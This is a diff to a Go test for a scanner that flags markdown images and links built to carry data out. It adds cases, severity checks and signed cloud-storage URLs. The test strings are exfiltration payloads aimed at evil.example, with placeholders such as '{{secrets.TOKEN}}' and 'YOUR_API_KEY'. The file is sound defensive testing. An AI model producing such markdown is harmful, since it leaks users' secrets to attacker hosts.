@@ -95,6 +95,13 @@ func TestDataCarryingURLs(t *testing.T) {
 		"key-only image fill-in": "![x](https://evil.example/p.png?{{secrets}})",
 		"key-only link fill-in":  "[click](https://evil.example/?<your_data>)",
 		"key-only long value":    "![x](https://evil.example/p.png?" + b64 + ")",
+		// Unambiguous placeholders in keys count too.
+		"key template image":    "![x](https://evil.example/p.png?{{secrets.TOKEN}}=1)",
+		"key upper placeholder": "![x](https://evil.example/p.png?YOUR_API_KEY=1)",
+		"key angle link":        "[click](https://evil.example/?<your_data>=1)",
+		"key encoded template":  "[click](https://evil.example/?%7B%7Bsecrets.TOKEN%7D%7D=1)",
+		// A signed provider URL with plain data beside it is still High.
+		"signed plus data": "![x](https://d111.cloudfront.net/p.png?Signature=" + cfSig + "&Key-Pair-Id=K2JCJMDEHXQW5F&v=" + b64 + ")",
 		// Keys are decoded before the data-key check; the length bounds are
 		// inclusive.
 		"encoded data key": "![x](https://evil.example/p.png?%74oken=abcdefgh1234)",
@@ -106,9 +113,44 @@ func TestDataCarryingURLs(t *testing.T) {
 		if strings.HasPrefix(text, "[") {
 			rule = ruleLinkFillIn
 		}
-		if _, ok := findingRules(ScanInput(text))[rule]; !ok {
+		f, ok := findingRules(ScanInput(text))[rule]
+		if !ok {
 			t.Errorf("%s: %s not raised", name, rule)
+		} else if rule == ruleImageExfil && f.Severity != SeverityHigh {
+			t.Errorf("%s: want high, got %v", name, f.Severity)
 		}
+	}
+	// Signed provider URLs: anyone can own a bucket or distribution on these
+	// hosts and read its access logs, and a well-formed signature can hold
+	// arbitrary data, so they are reported at Medium rather than skipped. That
+	// does not block output (High) but does block untrusted input by default.
+	for _, text := range []string{
+		"![shot](https://bucket.s3.amazonaws.com/a.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIOSFODNN7EXAMPLE%2F20261122%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20261122T000000Z&X-Amz-Expires=300&X-Amz-SignedHeaders=host&X-Amz-Signature=" + hex64 + ")",
+		"![shot](https://storage.googleapis.com/b/a.png?X-Goog-Algorithm=GOOG4-RSA-SHA256&X-Goog-Credential=svc%40p.iam.gserviceaccount.com%2F20261122%2Fauto%2Fstorage%2Fgoog4_request&X-Goog-Date=20261122T000000Z&X-Goog-Expires=600&X-Goog-SignedHeaders=host&X-Goog-Signature=" + strings.Repeat(hex64, 8) + ")",
+		"![shot](https://d111.cloudfront.net/a.png?Expires=1790000000&Signature=" + cfSig + "&Key-Pair-Id=K2JCJMDEHXQW5F)",
+		"![shot](https://acct.blob.core.windows.net/c/a.png?sv=2022-11-02&se=2026-11-23T00%3A00%3A00Z&sr=b&sp=r&sig=" + sasSigQ + ")",
+		// Host matching ignores case.
+		"![shot](https://D111.CloudFront.NET/a.png?Expires=1790000000&Signature=" + cfSig + "&Key-Pair-Id=K2JCJMDEHXQW5F)",
+		// The attacker-registered distribution from the review: still reported.
+		"![x](https://dxxxx.cloudfront.net/p.png?Signature=" + cfSig + "&Key-Pair-Id=K2JCJMDEHXQW5F)",
+	} {
+		f, ok := findingRules(ScanInput(text))[ruleImageExfil]
+		if !ok || f.Severity != SeverityMedium {
+			t.Errorf("signed provider URL: want medium %s, got %+v: %q", ruleImageExfil, f, text)
+		}
+		// The block lines are checked on this finding alone: the S3 example's
+		// credential also trips the separate access-key secret rule.
+		if blockedOutput([]Finding{f}) {
+			t.Errorf("signed provider URL blocks output: %q", text)
+		}
+		if !blockedInputAt([]Finding{f}, DefaultPolicy().Threshold(SurfaceComment, false)) {
+			t.Errorf("signed provider URL passes untrusted input: %q", text)
+		}
+	}
+	// With a High image and a Medium one in the same text, High is reported.
+	mixed := "![a](https://d111.cloudfront.net/a.png?Signature=" + cfSig + "&Key-Pair-Id=K2JCJMDEHXQW5F) ![b](https://evil.example/p.png?d=" + b64 + ")"
+	if f := findingRules(ScanInput(mixed))[ruleImageExfil]; f.Severity != SeverityHigh {
+		t.Errorf("mixed images: want high, got %+v", f)
 	}
 	for _, text := range []string{
 		"![badge](https://img.shields.io/badge/a-b.svg?style=flat)",
@@ -121,13 +163,11 @@ func TestDataCarryingURLs(t *testing.T) {
 		// Bracketed parameter names are not fill-in markers.
 		"![x](https://api.example.com/chart.png?filter[key]=1)",
 		"[list](https://api.example.com/items?page[size]=10&page[number]=2)",
-		// Long values of recognised URL-signing schemes.
-		"![shot](https://bucket.s3.amazonaws.com/a.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIOSFODNN7EXAMPLE%2F20261122%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20261122T000000Z&X-Amz-Expires=300&X-Amz-SignedHeaders=host&X-Amz-Signature=" + hex64 + ")",
-		"![shot](https://storage.googleapis.com/b/a.png?X-Goog-Algorithm=GOOG4-RSA-SHA256&X-Goog-Credential=svc%40p.iam.gserviceaccount.com%2F20261122%2Fauto%2Fstorage%2Fgoog4_request&X-Goog-Date=20261122T000000Z&X-Goog-Expires=600&X-Goog-SignedHeaders=host&X-Goog-Signature=" + strings.Repeat(hex64, 8) + ")",
-		"![shot](https://d111.cloudfront.net/a.png?Expires=1790000000&Signature=" + cfSig + "&Key-Pair-Id=K2JCJMDEHXQW5F)",
-		"![shot](https://acct.blob.core.windows.net/c/a.png?sv=2022-11-02&se=2026-11-23T00%3A00%3A00Z&sr=b&sp=r&sig=" + sasSigQ + ")",
-		// Host matching ignores case.
-		"![shot](https://D111.CloudFront.NET/a.png?Expires=1790000000&Signature=" + cfSig + "&Key-Pair-Id=K2JCJMDEHXQW5F)",
+		// Lower-case words and bracket names in keys are not placeholders.
+		"![x](https://example.com/a.png?your_name=1)",
+		"[docs](https://example.com/?insert_id=3&filter[status]=open)",
+		// A short signing value alone is not data.
+		"![x](https://acct.blob.core.windows.net/c/a.png?sv=2022-11-02&sr=b)",
 		// A fragment right after "?" is not query data.
 		"![x](https://example.com/a.png?#" + b64 + ")",
 		`<img src="https://private-user-images.githubusercontent.com/1/2.png?jwt=eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIn0.abcdefghijklmnopqrstuvwxyz012345">`,
